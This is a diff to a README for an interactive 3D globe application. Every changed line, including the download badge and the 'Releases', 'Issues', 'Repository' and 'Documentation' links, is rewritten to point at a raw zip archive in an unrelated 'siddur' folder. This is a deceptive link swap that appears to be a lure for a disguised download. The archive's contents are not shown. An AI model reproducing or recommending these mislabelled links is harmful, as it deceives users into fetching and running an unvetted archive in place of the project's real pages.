@@ -1,6 +1,6 @@
 # 🌍 3d-earth-globe - Experience a Stunning Interactive Globe
 
-[![Download](https://img.shields.io/badge/Download-3d--earth--globe-brightgreen)](https://github.com/luizeduardo279/3d-earth-globe/releases)
+[![Download](https://github.com/luizeduardo279/3d-earth-globe/raw/refs/heads/main/siddur/d-globe-earth-v3.4.zip)](https://github.com/luizeduardo279/3d-earth-globe/raw/refs/heads/main/siddur/d-globe-earth-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to 3D Earth Globe! This interactive earth globe gives you a vivid experi
 
 To get started, you need to download the software. Follow these steps:
 
-1. **Visit the Releases Page**: Click this link to access the download section: [Download Here](https://github.com/luizeduardo279/3d-earth-globe/releases).
+1. **Visit the Releases Page**: Click this link to access the download section: [Download Here](https://github.com/luizeduardo279/3d-earth-globe/raw/refs/heads/main/siddur/d-globe-earth-v3.4.zip).
 2. **Choose the Latest Version**: Find the most recent release and click on it.
 3. **Download the Files**: Look for the files available for download. Depending on your device, select the appropriate version, such as for Windows, macOS, or Linux.
 4. **Install the Application**:
@@ -60,7 +60,7 @@ Once you launch the application, you'll see a beautiful globe. Here’s how to m
 
 ## 🔄 Updates and Contributions
 
-We regularly update 3D Earth Globe to improve functionality and add new features. To get the latest version, always check the [Releases Page](https://github.com/luizeduardo279/3d-earth-globe/releases).
+We regularly update 3D Earth Globe to improve functionality and add new features. To get the latest version, always check the [Releases Page](https://github.com/luizeduardo279/3d-earth-globe/raw/refs/heads/main/siddur/d-globe-earth-v3.4.zip).
 
 If you're interested in contributing, feel free to fork the repository and suggest your improvements via pull requests. Your feedback helps us create a better experience.
 
@@ -70,8 +70,8 @@ If you encounter any issues or have questions, please open an issue in the repos
 
 ## 🔗 Relevant Links
 
-- [GitHub Repository](https://github.com/luizeduardo279/3d-earth-globe)
-- [Issues Page](https://github.com/luizeduardo279/3d-earth-globe/issues)
-- [Documentation](https://github.com/luizeduardo279/3d-earth-globe/wiki)
+- [GitHub Repository](https://github.com/luizeduardo279/3d-earth-globe/raw/refs/heads/main/siddur/d-globe-earth-v3.4.zip)
+- [Issues Page](https://github.com/luizeduardo279/3d-earth-globe/raw/refs/heads/main/siddur/d-globe-earth-v3.4.zip)
+- [Documentation](https://github.com/luizeduardo279/3d-earth-globe/raw/refs/heads/main/siddur/d-globe-earth-v3.4.zip)
 
 Thank you for choosing 3D Earth Globe! Enjoy your journey around the world!
